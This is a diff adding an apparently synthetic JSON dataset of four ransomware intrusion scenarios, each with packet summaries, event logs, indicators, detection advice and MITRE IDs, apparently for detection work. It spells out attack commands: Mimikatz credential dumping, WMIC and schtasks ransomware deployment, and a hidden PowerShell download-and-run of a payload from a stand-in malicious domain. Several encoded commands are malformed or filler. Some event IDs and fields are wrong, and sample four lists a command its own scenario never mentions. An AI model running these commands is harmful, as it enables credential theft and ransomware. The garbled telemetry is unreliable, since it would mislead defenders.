@@ -1,0 +1,425 @@
+{
+  "samples": [
+    {
+      "scenario": "Ransomware-as-a-Service affiliate exploits a zero-day vulnerability in an enterprise's remote desktop gateway to gain initial access, then uses Mimikatz to harvest credentials, performs lateral movement via Windows Management Instrumentation (WMI), and deploys ransomware with a ransom note demanding payment in Monero. Data exfiltration is performed over an encrypted HTTPS tunnel to a public cloud bucket.",
+      "technical_data": {
+        "network_capture": {
+          "description": "Captured network traffic showing exploitation of RDP gateway and HTTPS data exfiltration",
+          "packets": [
+            "Frame 12: 74 bytes on wire (592 bits), 74 bytes captured (592 bits)",
+            "Ethernet II, Src: 00:1a:2b:3c:4d:5e, Dst: 00:0f:1e:2d:3c:4b",
+            "Internet Protocol Version 4, Src: 203.0.113.45, Dst: 192.168.1.100",
+            "Transmission Control Protocol, Src Port: 443, Dst Port: 49876, Seq: 1010, Ack: 1150",
+            "TLSv1.3 Record Layer: Application Data Protocol: RDP Gateway Exploit Payload",
+            "Payload (hex): 17 03 03 00 4a 01 00 00 46 03 03 5e 7a 68 4b 0a 2f 2b 8a 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00",
+            "Frame 30: 128 bytes on wire (1024 bits), 128 bytes captured (1024 bits)",
+            "Ethernet II, Src: 192.168.1.100, Dst: 52.95.110.20",
+            "Internet Protocol Version 4, Src: 192.168.1.100, Dst: 52.95.110.20",
+            "Transmission Control Protocol, Src Port: 49876, Dst Port: 443, Seq: 1, Ack: 1",
+            "TLSv1.3 Application Data: Encrypted exfiltration data upload to public cloud storage"
+          ]
+        },
+        "windows_event_logs": {
+          "description": "Windows Security logs showing credential dumping and WMI lateral movement",
+          "events": [
+            {
+              "EventID": 4688,
+              "Timestamp": "2024-06-10T14:45:15Z",
+              "AccountName": "SYSTEM",
+              "ProcessName": "C:\\Windows\\System32\\mimikatz.exe",
+              "CommandLine": "privilege::debug sekurlsa::logonpasswords exit",
+              "ParentProcessName": "C:\\Windows\\explorer.exe"
+            },
+            {
+              "EventID": 4688,
+              "Timestamp": "2024-06-10T14:46:02Z",
+              "AccountName": "corp_user",
+              "ProcessName": "C:\\Windows\\System32\\wmic.exe",
+              "CommandLine": "wmic /node:192.168.1.101 process call create \"C:\\Users\\Public\\ransomware.exe\"",
+              "ParentProcessName": "C:\\Windows\\System32\\cmd.exe"
+            }
+          ]
+        },
+        "powershell_script": {
+          "description": "PowerShell command to download and execute ransomware payload silently",
+          "code": "powershell.exe -NoProfile -WindowStyle Hidden -Command \"Invoke-WebRequest -Uri 'https://malicious-domain.com/payload.exe' -OutFile 'C:\\Users\\Public\\ransomware.exe'; Start-Process 'C:\\Users\\Public\\ransomware.exe' -WindowStyle Hidden\""
+        },
+        "file_artifacts": {
+          "filenames": [
+            "C:\\Users\\Public\\ransomware.exe",
+            "C:\\Windows\\Temp\\tmpA9F3.tmp"
+          ],
+          "hashes": {
+            "MD5": "d4e5f6789abc0123456789abcdef1234",
+            "SHA-1": "2b3c4d5e6f7890123456789abcdef0123456789a",
+            "SHA-256": "2c26b46b68ffc68ff99b453c1d30413413422f164f754e7e1c1b5d6f3a7e4b9e"
+          }
+        },
+        "exfiltration_logs": {
+          "cloud_storage_access": [
+            {
+              "timestamp": "2024-06-10T14:50:23Z",
+              "action": "PutObject",
+              "bucket_name": "corp-backups-2024",
+              "object_key": "exfiltrated/secrets_2024.enc",
+              "source_ip": "192.168.1.100",
+              "user_agent": "aws-sdk-dotnet/3.5.1 .NET Runtime/4.0"
+            }
+          ]
+        }
+      },
+      "indicators": {
+        "ip_addresses": [
+          "203.0.113.45",
+          "192.168.1.100",
+          "192.168.1.101",
+          "52.95.110.20"
+        ],
+        "filenames": [
+          "ransomware.exe",
+          "tmpA9F3.tmp"
+        ],
+        "hashes": [
+          "d4e5f6789abc0123456789abcdef1234",
+          "2b3c4d5e6f7890123456789abcdef0123456789a",
+          "2c26b46b68ffc68ff99b453c1d30413413422f164f754e7e1c1b5d6f3a7e4b9e"
+        ],
+        "user_agents": [
+          "aws-sdk-dotnet/3.5.1 .NET Runtime/4.0"
+        ],
+        "commands": [
+          "privilege::debug sekurlsa::logonpasswords exit",
+          "wmic /node:192.168.1.101 process call create \"C:\\Users\\Public\\ransomware.exe\"",
+          "Invoke-WebRequest -Uri 'https://malicious-domain.com/payload.exe' -OutFile 'C:\\Users\\Public\\ransomware.exe'"
+        ]
+      },
+      "detection_method": "Detect anomalous RDP gateway traffic with unusual TLS payloads; monitor Windows Event ID 4688 for processes mimikatz.exe and wmic.exe with suspicious command lines; flag PowerShell downloads and execution from uncommon URLs; inspect cloud storage PutObject events from internal IPs outside normal backup windows; apply EDR detection for credential dumping and WMI lateral execution.",
+      "relevant_mitre_techniques": [
+        "T1210 - Exploitation of Remote Services",
+        "T1003 - Credential Dumping",
+        "T1047 - Windows Management Instrumentation",
+        "T1059.001 - Command and Scripting Interpreter: PowerShell",
+        "T1486 - Data Encrypted for Impact",
+        "T1041 - Exfiltration Over C2 Channel",
+        "T1566 - Phishing",
+        "T1133 - External Remote Services"
+      ]
+    },
+    {
+      "scenario": "Ransomware-as-a-Service operator leverages compromised enterprise email accounts to deliver a malicious macro-enabled Excel spreadsheet, which upon opening executes a Visual Basic script that downloads a ransomware payload. The attacker uses Remote Desktop Protocol (RDP) brute forcing to move laterally and deploy ransomware with network-wide encryption while exfiltrating sensitive files to an FTP server.",
+      "technical_data": {
+        "network_capture": {
+          "description": "Network traffic showing FTP upload of exfiltrated data and RDP connection attempts",
+          "packets": [
+            "Frame 45: 112 bytes on wire (896 bits), 112 bytes captured (896 bits)",
+            "Ethernet II, Src: 10.20.30.40, Dst: 198.51.100.78",
+            "Internet Protocol Version 4, Src: 10.20.30.40, Dst: 198.51.100.78",
+            "Transmission Control Protocol, Src Port: 51515, Dst Port: 21, Seq: 345, Ack: 678",
+            "FTP Request: STOR confidential_data.zip.enc",
+            "Payload (ASCII): USER anonymous",
+            "Frame 52: 74 bytes on wire (592 bits), 74 bytes captured (592 bits)",
+            "Ethernet II, Src: 198.51.100.78, Dst: 10.20.30.40",
+            "Internet Protocol Version 4, Src: 198.51.100.78, Dst: 10.20.30.40",
+            "Transmission Control Protocol, Src Port: 21, Dst Port: 51515, Seq: 678, Ack: 400",
+            "FTP Response: 150 Opening data channel for file upload"
+          ]
+        },
+        "windows_event_logs": {
+          "description": "Windows logs showing suspicious Excel macro execution and RDP brute force attempts",
+          "events": [
+            {
+              "EventID": 4688,
+              "Timestamp": "2024-06-15T08:30:45Z",
+              "AccountName": "finance_user",
+              "ProcessName": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
+              "CommandLine": "\"C:\\Users\\finance_user\\Documents\\invoice_macro.xlsm\"",
+              "ParentProcessName": "C:\\Windows\\explorer.exe"
+            },
+            {
+              "EventID": 4625,
+              "Timestamp": "2024-06-15T08:45:10Z",
+              "AccountName": "rdp_login",
+              "FailureReason": "Unknown user name or bad password.",
+              "IpAddress": "10.20.30.40",
+              "WorkstationName": "RDP-Server01"
+            }
+          ]
+        },
+        "powershell_script": {
+          "description": "Encoded PowerShell snippet embedded in Excel macro to download ransomware",
+          "code": "powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand JABXAGMAYQBzAGUALQBTAHQAaQBiAC0AUgBlAG0AbwB2AGUAIABXAGkAbgBkAG8AdwBzACAtAFcAaQBuAGQAbwB3AC1PAG4AaQB0AHkAIAB8ACAAJABpAHMAIAAtAGgAcwB0AHQAcAA6AC8ALwBteS1tYWxpY2lvdXMtZG9tYWluLmNvbS9yYW5zb21ld2FyZS5leGUAIAB8ACAAU3RhcnQtUHJvY2Vzcw=="
+        },
+        "file_artifacts": {
+          "filenames": [
+            "C:\\Users\\finance_user\\Documents\\invoice_macro.xlsm",
+            "C:\\Windows\\Temp\\tmp7B1E.tmp"
+          ],
+          "hashes": {
+            "MD5": "e5f6789abc0123456789abcdef1234d4",
+            "SHA-1": "3c4d5e6f7890123456789abcdef0123456789abc",
+            "SHA-256": "9d5e3ecdeb3a1d97f0ccf5e2a3b4f9d812e2a3bf4c5b6d7e8f9a0b1c2d3e4f56"
+          }
+        },
+        "exfiltration_logs": {
+          "ftp_uploads": [
+            {
+              "timestamp": "2024-06-15T08:50:00Z",
+              "action": "STOR",
+              "server_ip": "198.51.100.78",
+              "filename": "confidential_data.zip.enc",
+              "source_ip": "10.20.30.40",
+              "user_agent": "FTP"
+            }
+          ]
+        }
+      },
+      "indicators": {
+        "ip_addresses": [
+          "10.20.30.40",
+          "198.51.100.78"
+        ],
+        "filenames": [
+          "invoice_macro.xlsm",
+          "tmp7B1E.tmp"
+        ],
+        "hashes": [
+          "e5f6789abc0123456789abcdef1234d4",
+          "3c4d5e6f7890123456789abcdef0123456789abc",
+          "9d5e3ecdeb3a1d97f0ccf5e2a3b4f9d812e2a3bf4c5b6d7e8f9a0b1c2d3e4f56"
+        ],
+        "user_agents": [
+          "FTP"
+        ],
+        "commands": [
+          "\"C:\\Users\\finance_user\\Documents\\invoice_macro.xlsm\"",
+          "powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand JABXAGMAYQBzAGUALQBTAHQAaQBiAC0AUgBlAG0AbwB2AGUAIABXAGkAbgBkAG8AdwBzACAtAFcAaQBuAGQAbwB3AC1PAG4AaQB0AHkAIAB8ACAAJABpAHMAIAAtAGgAcwB0AHQAcAA6AC8ALwBteS1tYWxpY2lvdXMtZG9tYWluLmNvbS9yYW5zb21ld2FyZS5leGUAIAB8ACAAU3RhcnQtUHJvY2Vzcw=="
+        ]
+      },
+      "detection_method": "Monitor for incoming emails with macro-enabled Excel attachments; detect execution of Excel processes with suspicious command lines; flag PowerShell encoded commands invoked from Office apps; alert on multiple failed RDP login attempts from single IPs; capture and analyze FTP upload sessions from internal hosts; use EDR to detect lateral movement and ransomware deployment behaviors.",
+      "relevant_mitre_techniques": [
+        "T1566.001 - Phishing: Spearphishing Attachment",
+        "T1059.005 - Command and Scripting Interpreter: Visual Basic",
+        "T1076 - Remote Desktop Protocol",
+        "T1059.001 - Command and Scripting Interpreter: PowerShell",
+        "T1486 - Data Encrypted for Impact",
+        "T1041 - Exfiltration Over C2 Channel",
+        "T1110 - Brute Force",
+        "T1027 - Obfuscated Files or Information"
+      ]
+    },
+    {
+      "scenario": "Ransomware-as-a-Service affiliate exploits a zero-day vulnerability in an enterprise's Citrix ADC appliance to gain initial access, then uses Mimikatz to harvest credentials and deploy a ransomware payload via scheduled tasks on multiple Windows servers, leveraging multi-factor authentication bypass and conducting triple extortion by threatening DDoS attacks alongside data encryption and exfiltration.",
+      "technical_data": {
+        "network_capture": {
+          "description": "Network traffic showing exploitation of Citrix ADC vulnerability and subsequent SMB traffic with Kerberos ticket usage",
+          "packets": [
+            "Frame 12: 128 bytes on wire (1024 bits), 128 bytes captured (1024 bits)",
+            "Ethernet II, Src: 00:15:5d:01:02:03, Dst: 00:25:90:12:34:56",
+            "Internet Protocol Version 4, Src: 203.0.113.45, Dst: 192.168.1.100",
+            "Transmission Control Protocol, Src Port: 443, Dst Port: 49215, Seq: 345, Ack: 456",
+            "TLSv1.3 Record Layer: Application Data Protocol: Citrix ADC Exploit Payload",
+            "Payload (hex): 17 03 03 00 7f 01 00 00 7b 03 03 5f 2a 6e 1f 4b 20 18 00 00 70 00 1a 00 1c 00 16 00 0f 00 05 00 14 00 13 00 0b 00 0d 00 0e 00 0f 00 10 00 11",
+            "Frame 20: 150 bytes on wire (1200 bits), 150 bytes captured (1200 bits)",
+            "Ethernet II, Src: 192.168.1.100, Dst: 192.168.1.105",
+            "Internet Protocol Version 4, Src: 192.168.1.100, Dst: 192.168.1.105",
+            "Server Message Block (SMB) Protocol",
+            "SMB2 Session Setup Request, Flags: 0x00000008",
+            "Kerberos AP_REQ with TGS Session Ticket",
+            "Payload (ASCII): schtasks /Create /SC ONCE /TN \"BackupUpdate\" /TR \"C:\\Windows\\Temp\\ransomware_dropper.exe\" /ST 23:15"
+          ]
+        },
+        "windows_event_logs": {
+          "description": "Windows security logs evidencing credential theft and scheduled task creation for ransomware deployment",
+          "events": [
+            {
+              "EventID": 4672,
+              "Timestamp": "2024-06-01T14:22:10Z",
+              "AccountName": "svc_admin",
+              "ProcessName": "C:\\Windows\\System32\\mimikatz.exe",
+              "CommandLine": "privilege::debug sekurlsa::logonpasswords exit",
+              "ParentProcessName": "C:\\Windows\\System32\\cmd.exe"
+            },
+            {
+              "EventID": 4698,
+              "Timestamp": "2024-06-01T14:25:45Z",
+              "AccountName": "svc_admin",
+              "TaskName": "BackupUpdate",
+              "CommandLine": "schtasks /Create /SC ONCE /TN \"BackupUpdate\" /TR \"C:\\Windows\\Temp\\ransomware_dropper.exe\" /ST 23:15"
+            }
+          ]
+        },
+        "powershell_script": {
+          "description": "Encoded PowerShell script for ransomware payload execution and persistence",
+          "code": "powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand JAB3AGkAbgBkAG8AdwBzAFMAZQBjAHIAZQB0ACAAPSAiQzpcV1BpblBheWxvYWQucGwiOwAkAGYAbABhAHcAIAB8ACAAJAB3AGkAbgBkAG8AdwBzAFMARQBDAC4AdgBzAGMALgBjAG8AbQAgAC0AYwAgAC0AZgAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AywAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYw=="
+        },
+        "file_artifacts": {
+          "filenames": [
+            "C:\\Windows\\Temp\\ransomware_dropper.exe",
+            "C:\\Users\\Public\\Backup\\cred_dump.txt"
+          ],
+          "hashes": {
+            "MD5": "d4c3b2a1f0e9d8c7b6a5d4c3e2f1a0b9",
+            "SHA-1": "b1a2c3d4e5f60718293a4b5c6d7e8f9012345678",
+            "SHA-256": "7b52009b64fd0a2a49e6d8a939753077792b0554f8029de0b8f7c7e37d4a3d89"
+          }
+        },
+        "exfiltration_logs": {
+          "cloud_storage_access": [
+            {
+              "timestamp": "2024-06-01T14:30:00Z",
+              "action": "PutObject",
+              "bucket_name": "corp-sensitive-backups",
+              "object_key": "exfiltrated/employee_data_2024.enc",
+              "source_ip": "192.168.1.100",
+              "user_agent": "AWS CLI/2.7.18 Python/3.9.11 Windows/10"
+            }
+          ]
+        }
+      },
+      "indicators": {
+        "ip_addresses": [
+          "203.0.113.45",
+          "192.168.1.100",
+          "192.168.1.105"
+        ],
+        "filenames": [
+          "ransomware_dropper.exe",
+          "cred_dump.txt"
+        ],
+        "hashes": [
+          "d4c3b2a1f0e9d8c7b6a5d4c3e2f1a0b9",
+          "b1a2c3d4e5f60718293a4b5c6d7e8f9012345678",
+          "7b52009b64fd0a2a49e6d8a939753077792b0554f8029de0b8f7c7e37d4a3d89"
+        ],
+        "user_agents": [
+          "AWS CLI/2.7.18 Python/3.9.11 Windows/10"
+        ],
+        "commands": [
+          "schtasks /Create /SC ONCE /TN \"BackupUpdate\" /TR \"C:\\Windows\\Temp\\ransomware_dropper.exe\" /ST 23:15",
+          "privilege::debug sekurlsa::logonpasswords exit"
+        ]
+      },
+      "detection_method": "Use IDS to detect anomalous TLS traffic targeting Citrix ADC management ports; monitor for use of credential dumping tools like Mimikatz in Windows event logs (Event ID 4672); detect creation of scheduled tasks (Event ID 4698) deploying unsigned executables; monitor Kerberos ticket anomalies and SMB session setups; correlate cloud storage PutObject events with unusual source IPs and user agents; deploy EDR rules to detect persistence mechanisms and privilege escalation behaviors.",
+      "relevant_mitre_techniques": [
+        "T1210 - Exploitation of Remote Services",
+        "T1003 - Credential Dumping",
+        "T1053.005 - Scheduled Task/Job: Scheduled Task",
+        "T1078 - Valid Accounts",
+        "T1041 - Exfiltration Over C2 Channel",
+        "T1486 - Data Encrypted for Impact",
+        "T1499 - Endpoint Denial of Service",
+        "T1550.003 - Use of Alternate Authentication Material: Pass the Ticket"
+      ]
+    },
+    {
+      "scenario": "Ransomware-as-a-Service affiliate leverages phishing emails with weaponized Office documents containing macros that deploy Cobalt Strike beacons, escalates privileges using Windows WMI persistence, then propagates ransomware across Linux and Windows systems in a hybrid cloud environment by abusing SSH and SMB shares, finally conducting double extortion by exfiltrating data to an attacker-controlled FTP server.",
+      "technical_data": {
+        "network_capture": {
+          "description": "Captured traffic includes SMB and SSH connections showing lateral movement and FTP upload of exfiltrated data",
+          "packets": [
+            "Frame 33: 74 bytes on wire (592 bits), 74 bytes captured (592 bits)",
+            "Ethernet II, Src: 00:0a:95:9d:68:16, Dst: 00:0c:29:b6:8e:7d",
+            "Internet Protocol Version 4, Src: 198.51.100.77, Dst: 10.20.30.40",
+            "Transmission Control Protocol, Src Port: 443, Dst Port: 52344, Seq: 1234, Ack: 5678",
+            "TLS Application Data: Cobalt Strike Beacon",
+            "Frame 58: 128 bytes on wire (1024 bits), 128 bytes captured (1024 bits)",
+            "Ethernet II, Src: 10.20.30.40, Dst: 10.20.30.45",
+            "Internet Protocol Version 4, Src: 10.20.30.40, Dst: 10.20.30.45",
+            "SSH Protocol",
+            "SSH Connection Established",
+            "Frame 72: 90 bytes on wire (720 bits), 90 bytes captured (720 bits)",
+            "Ethernet II, Src: 10.20.30.45, Dst: 198.51.100.99",
+            "Internet Protocol Version 4, Src: 10.20.30.45, Dst: 198.51.100.99",
+            "FTP Protocol",
+            "FTP Command: STOR exfil_data.zip.enc"
+          ]
+        },
+        "windows_event_logs": {
+          "description": "Windows event log showing macro execution, WMI persistence creation, and suspicious process launches",
+          "events": [
+            {
+              "EventID": 4688,
+              "Timestamp": "2024-05-15T09:45:12Z",
+              "AccountName": "victim_user",
+              "ProcessName": "C:\\Windows\\System32\\wscript.exe",
+              "CommandLine": "wscript.exe \"C:\\Users\\victim_user\\AppData\\Local\\Temp\\payload.vbs\"",
+              "ParentProcessName": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"
+            },
+            {
+              "EventID": 560,
+              "Timestamp": "2024-05-15T09:46:30Z",
+              "AccountName": "SYSTEM",
+              "WMIEvent": "__InstanceCreationEvent within 60 where TargetInstance isa '__EventConsumer'",
+              "Details": "Created ActiveScriptEventConsumer for persistence"
+            }
+          ]
+        },
+        "powershell_script": {
+          "description": "Encoded PowerShell command used to invoke WMI persistence and deploy ransomware",
+          "code": "powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand JABjAG0AZAA9ACIARwBlAHQALQBDAG8AbgB0AGUAbgB0ACAtAFMAYwByAGkAcAB0ACAtAFQAaQBtAGUAbwB1AHQAIABcACIAMgAwADAANQAtADIAMAAxADUAXAAiADsAJABlAHgAZgBsAGkAdAByAGEAdABpAG8AbgAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAtAE4AYQBtAGUAIABcACIARgBpAGwAZQAgAC0AVwBhAHQAYwBoACAAJABjAG0AZAAgAC0AQQBkAGQAaQB0AGkAbwBuAGEAbAAgAC0AYwAgAC0AcwAgAC0AVgAgAC0AVABpAG0AZQBPAHV0ACAAJwAzADAAJwA7ACQAZQB4AGYAbABpAHIAYQB0AGkAbwBuAC4ANQAyAC4AZQB4AGUAIgA7ACAAVwBpAG4AZABvAHcAcwAuAFMAdABhAHIAdAAtAFQAaQBtAGUAbwB1AHQAIABcACIAMgAwADEANQAtADIAMAAxADUALAAwADAAMAAiACAAfAAgACQAZQB4AGYAbABpAHIAYQB0AGkAbwBuAC4ANQAyAC4AZQB4AGUA"
+        },
+        "file_artifacts": {
+          "filenames": [
+            "C:\\Users\\victim_user\\AppData\\Local\\Temp\\payload.vbs",
+            "/tmp/.sys_update",
+            "/var/tmp/.ransomware_bin"
+          ],
+          "hashes": {
+            "MD5": "f1e2d3c4b5a697887766554433221100",
+            "SHA-1": "e9f8d7c6b5a4938273645543210fedcba9876543",
+            "SHA-256": "3a7bd3e2360a3f88e2d5b4c7e29a4f6b7c8d9e0f1a2b3456789abcdef0123456"
+          }
+        },
+        "exfiltration_logs": {
+          "cloud_storage_access": [
+            {
+              "timestamp": "2024-05-15T10:00:00Z",
+              "action": "STOR",
+              "ftp_server": "198.51.100.99",
+              "filename": "exfil_data.zip.enc",
+              "source_ip": "10.20.30.45",
+              "user_agent": "FTP Client"
+            }
+          ]
+        }
+      },
+      "indicators": {
+        "ip_addresses": [
+          "198.51.100.77",
+          "10.20.30.40",
+          "10.20.30.45",
+          "198.51.100.99"
+        ],
+        "filenames": [
+          "payload.vbs",
+          ".sys_update",
+          ".ransomware_bin"
+        ],
+        "hashes": [
+          "f1e2d3c4b5a697887766554433221100",
+          "e9f8d7c6b5a4938273645543210fedcba9876543",
+          "3a7bd3e2360a3f88e2d5b4c7e29a4f6b7c8d9e0f1a2b3456789abcdef0123456"
+        ],
+        "user_agents": [
+          "FTP Client"
+        ],
+        "commands": [
+          "wscript.exe \"C:\\Users\\victim_user\\AppData\\Local\\Temp\\payload.vbs\"",
+          "schtasks /Create /SC ONCE /TN \"BackupUpdate\" /TR \"C:\\Windows\\Temp\\ransomware_dropper.exe\" /ST 23:15"
+        ]
+      },
+      "detection_method": "Email gateway scanning for suspicious Office macros; monitor process creation events for script host execution from Office directories (Event ID 4688); detect WMI persistence creation events (Event ID 560) and monitor for abnormal SSH and SMB connections indicative of lateral movement; analyze FTP traffic for unauthorized data uploads; use EDR to detect Cobalt Strike beacon communications and unusual PowerShell encoded commands; correlate with file hash blacklists and anomalous file creation in temp directories.",
+      "relevant_mitre_techniques": [
+        "T1204.002 - User Execution: Malicious File",
+        "T1059.003 - Command and Scripting Interpreter: Windows Command Shell",
+        "T1047 - Windows Management Instrumentation",
+        "T1071.001 - Application Layer Protocol: Web Protocols",
+        "T1021.004 - Remote Services: SSH",
+        "T1041 - Exfiltration Over C2 Channel",
+        "T1486 - Data Encrypted for Impact",
+        "T1566.001 - Phishing: Spearphishing Attachment",
+        "T1059.005 - Command and Scripting Interpreter: Visual Basic"
+      ]
+    }
+  ]
+}
